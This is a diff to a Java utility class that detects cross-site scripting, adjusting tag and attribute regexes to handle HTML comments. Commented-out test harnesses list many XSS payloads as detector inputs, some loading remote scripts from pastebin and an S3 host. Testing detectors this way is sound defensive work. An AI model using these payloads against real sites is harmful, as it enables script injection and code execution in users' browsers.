@@ -21,6 +21,8 @@ import java.util.regex.Pattern;
 
 public class CallbackUtils {
 
+	private static final String HTML_COMMENT_END = "-->";
+	private static final String HTML_COMMENT_START = "!--";
 	public static final String C = "%3c";
 	private static final FileLoggerThreadPool logger = FileLoggerThreadPool.getInstance();
 	public static final String BACKWARD_SLASH = "/";
@@ -87,9 +89,9 @@ public class CallbackUtils {
 	public static final String ANGLE_START_URL_ENCODED_UPPERCASE = "%3C";
 
 	public static Pattern tagNameRegex = Pattern
-			.compile("<([a-zA-Z_-]+[0-9]*)", Pattern.MULTILINE | Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
+			.compile("<([a-zA-Z_\\-]+[0-9]*|!--)", Pattern.MULTILINE | Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
 	public static Pattern attribRegex = Pattern.compile(
-			"([^(\\/\\s<'\")]+?)=((?:\\s*?)('|\")([\\s\\S]*?)(?:(?=(\\\\?))\\5.)*?\\3|\\S*[^>])",
+			"([^(\\/\\s<'\")]+?)(?:\\s*)=\\s*(('|\")([\\s\\S]*?)(?:(?=(\\\\?))\\5.)*?\\3|.+?(?=\\/>|>|\\?>|\\s|<\\/))",
 			Pattern.MULTILINE | Pattern.CASE_INSENSITIVE | Pattern.DOTALL);
 
 	private static Map<Integer, JADatabaseMetaData> sqlConnectionMap;
@@ -193,6 +195,16 @@ public class CallbackUtils {
 			}
 			startPos = matcher.start();
 			currPos = matcher.end() - 1;
+			if(StringUtils.equals(HTML_COMMENT_START, tagName)) {
+				tmpCurrPos = StringUtils.indexOf(data, HTML_COMMENT_END, startPos);
+				if(tmpCurrPos == -1) {
+					break;
+				} else {
+					currPos = tmpCurrPos;
+					continue;
+				}
+				
+			}
 			tmpStartPos = tmpCurrPos = StringUtils.indexOf(data, ANGLE_END, startPos);
 
 			if(tmpCurrPos == -1 ) {
@@ -206,7 +218,7 @@ public class CallbackUtils {
 				tmpCurrPos = StringUtils.indexOf(data, ANGLE_END, tmpStartPos);
 
 				if ((tmpCurrPos == -1 || attribMatcher.start() < tmpCurrPos)) {
-					tmpStartPos = tmpCurrPos = attribMatcher.end() - 1;
+					tmpStartPos = tmpCurrPos = attribMatcher.end() -1;
 					tmpStartPos++;
 					if (StringUtils.isBlank(attribMatcher.group(3)) && attribMatcher.end() >= tmpCurrPos) {
 						tmpStartPos = tmpCurrPos = StringUtils.indexOf(data, ANGLE_END, attribMatcher.start());
@@ -231,6 +243,7 @@ public class CallbackUtils {
 			}
 			if (data.charAt(currPos) != ANGLE_END_CHAR) {
 				int tmp = StringUtils.indexOf(data, ANGLE_END, currPos);
+				
 				if (tmp != -1) {
 					currPos = tmp;
 				}
@@ -265,39 +278,42 @@ public class CallbackUtils {
 	}
 	
 //	public static void main(String[] args) {
-//		System.out.println(getXSSConstructs("<form><isindex formaction=\"javascript&colon;confirm(1)\""));
+//		System.out.println(getXSSConstructs("<svg><script xlink:href=data&colon;,alert(\"sasas\") </script"));
+//		System.out.println(getXSSConstructs("<script><?script>"));
 //	}
 
-	//    public static void main(String[] args) {
-	//        System.out.println("Detection : " + isXSS("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
-	//        System.out.println("Detection : " + isXSS("<img src=\"///\" onerror=\"a = document.createElement('script'); a.src = 'http://demofilespa.s3.amazonaws.com/jfptest.js'; document.head.appendChild(a);\" />"));
-	//        System.out.println("Detection : " + isXSS("<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\""));
-	//        System.out.println("Detection : " + isXSS("<script /**/>/**/alert(1)/**/</script /**/"));
-	//        System.out.println("Detection : " + isXSS("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
-	//
-	//        System.out.println("Detection : " + isXSS("<script src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" >"));
-	//
-	//        System.out.println("Detection : " + isXSS("<<script  src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" > </script"));
-	//
-	//        System.out.println("Detection : " + isXSS("<img src=\"/\" =_=\" title=\"\nonerror='prompt(1)'\">"));
-	//
-	//        System.out.println("Detection : " + isXSS("<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">"));
-	//
-	//        System.out.println("Detection : " + isXSS("<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"));
-	//
-	//        System.out.println("Detection : " + isXSS("<<SCRIPT>ale\nrt(\"XSS\");//<</SCRIPT>>>>"));
-	//
-	//        System.out.println("Detection : " + isXSS("<script\n" +
-	//                ">alert(1); \n" +
-	//                "</script\n" +
-	//                ">"));
-	//
-	//        System.out.println("Detection : " + isXSS("<img src=x onerror= alert(1)>"));
-	//        System.out.println("Detection : " + isXSS("<img src=x onerror=alert(1)>"));
-	//        System.out.println("Detection : " + isXSS("<img onerror=alert(1) >"));
-	//        System.out.println("Detection : " + isXSS("<img src=x onerror=\"alert(1)\" > "));
-	//
-	//    }
+//	    public static void main(String[] args) {
+//	    	System.out.println(getXSSConstructs("<svg><script xlink:href=data&colon;,alert(\"sasas\") </script"));
+//			System.out.println(getXSSConstructs("<script><?script>"));
+//	        System.out.println("Detection : " + getXSSConstructs("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
+//	        System.out.println("Detection : " + getXSSConstructs("<img src=\"///\" onerror=\"a = document.createElement('script'); a.src = 'http://demofilespa.s3.amazonaws.com/jfptest.js'; document.head.appendChild(a);\" />"));
+//	        System.out.println("Detection : " + getXSSConstructs("<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\""));
+//	        System.out.println("Detection : " + getXSSConstructs("<script /**/>/**/alert(1)/**/</script /**/"));
+//	        System.out.println("Detection : " + getXSSConstructs("<script src=\"https://pastebin.com/raw/uGh7zGnN\"></script"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<script src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" >"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<<script  src=\"http://demofilespa.s3.amazonaws.com/jfptest.js\" > </script"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<img src=\"/\" =_=\" title=\"\nonerror='prompt(1)'\">"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<<SCRIPT>ale\nrt(\"XSS\");//<</SCRIPT>>>>"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<script\n" +
+//	                ">alert(1); \n" +
+//	                "</script\n" +
+//	                ">"));
+//	
+//	        System.out.println("Detection : " + getXSSConstructs("<img src=x onerror= alert(1)>"));
+//	        System.out.println("Detection : " + getXSSConstructs("<img src=x onerror=alert(1)>"));
+//	        System.out.println("Detection : " + getXSSConstructs("<img onerror=alert(1) >"));
+//	        System.out.println("Detection : " + getXSSConstructs("<img src=x onerror=\"alert(1)\" > "));
+//	
+//	    }
 
 	/**
 	 * @return the sqlConnectionMap
